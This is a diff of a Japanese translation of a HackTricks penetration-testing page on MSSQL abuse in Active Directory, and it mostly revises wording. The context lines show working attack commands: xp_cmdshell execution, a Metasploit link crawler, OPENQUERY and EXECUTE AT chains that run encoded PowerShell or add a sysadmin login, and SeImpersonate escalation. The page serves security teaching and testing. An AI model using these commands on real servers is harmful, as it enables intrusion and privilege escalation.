@@ -3,7 +3,7 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## **MSSQLの列挙 / 発見**
+## **MSSQL Enumeration / Discovery**
 
 ### Python
 
@@ -161,12 +161,12 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-MSSQLホスト内で**コマンドを実行する**ことも可能かもしれません。
+MSSQLホスト内で**コマンドを実行**することも可能かもしれません。
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-以下のセクションで手動でこれを行う方法を確認してください。
+チェックインのページには、**次のセクションで手動でこれを行う方法が記載されています。**
 
 ### MSSQL基本ハッキングテクニック
 
@@ -176,9 +176,9 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL信頼されたリンク
 
-MSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合（データベースリンク）。ユーザーが信頼されたデータベースに対して権限を持っている場合、**信頼関係を利用して他のインスタンスでもクエリを実行することができます**。この信頼は連鎖させることができ、ユーザーはコマンドを実行できる誤って構成されたデータベースを見つけることができるかもしれません。
+MSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合（データベースリンク）。ユーザーが信頼されたデータベースに対して権限を持っている場合、**信頼関係を利用して他のインスタンスでもクエリを実行することができます**。この信頼は連鎖させることができ、ユーザーはコマンドを実行できるような誤って構成されたデータベースを見つけることができるかもしれません。
 
-**データベース間のリンクは、フォレスト信頼を越えても機能します。**
+**データベース間のリンクは、フォレストトラストを越えても機能します。**
 
 ### Powershellの悪用
 ```bash
@@ -226,7 +226,7 @@ metasploitを使用して、信頼できるリンクを簡単に確認できま�
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-注意してください、metasploitはMSSQLの`openquery()`関数のみを悪用しようとします（したがって、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動で**試す必要があります。詳細は以下を参照してください。）
+メタスプリットはMSSQLの`openquery()`関数のみを悪用しようとします（したがって、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動で**試す必要があります。詳細は以下を参照してください。）
 
 ### 手動 - Openquery()
 
@@ -247,12 +247,12 @@ EXEC sp_linkedservers;
 
 #### 信頼できるリンクでクエリを実行する
 
-リンクを通じてクエリを実行します（例：新しいアクセス可能なインスタンスでさらにリンクを見つける）：
+リンクを通じてクエリを実行します（例：新しいアクセス可能なインスタンスでさらにリンクを見つける）。
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> ダブルクオートとシングルクオートがどこで使用されているか確認してください。それらをそのように使用することが重要です。
+> ダブルクォートとシングルクォートがどこで使用されているか確認してください。それらをそのように使用することが重要です。
 
 ![](<../../images/image (643).png>)
 
@@ -264,7 +264,7 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-`openquery()`から`exec xp_cmdshell`のようなアクションを実行できない場合は、`EXECUTE`メソッドを試してください。
+`exec xp_cmdshell`を`openquery()`から実行できない場合は、`EXECUTE`メソッドを試してください。
 
 ### 手動 - EXECUTE
 
@@ -278,8 +278,16 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な種類の特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。
 
-多くの著者が考案した戦略は、攻撃者が作成した悪意のあるまたは中間者サービスにSYSTEMサービスを認証させることです。この悪意のあるサービスは、認証を試みている間にSYSTEMサービスを偽装することができます。
+多くの著者が考案した戦略は、攻撃者が作成した悪意のあるまたは中間者サービスにSYSTEMサービスを認証させることです。この悪意のあるサービスは、SYSTEMサービスが認証を試みている間にそのサービスを偽装することができます。
 
-[SweetPotato](https://github.com/CCob/SweetPotato)は、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまな技術のコレクションを持っています。
+[SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまな技術のコレクションがあります。
+
+
+
+### SCCM管理ポイントNTLMリレー（OSDシークレット抽出）
+SCCM **管理ポイント**のデフォルトSQLロールが、サイトデータベースからネットワークアクセスアカウントとタスクシーケンスのシークレットをダンプするためにどのように悪用されるかを確認してください：
+{{#ref}}
+sccm-management-point-relay-sql-policy-secrets.md
+{{#endref}}
 
 {{#include ../../banners/hacktricks-training.md}}
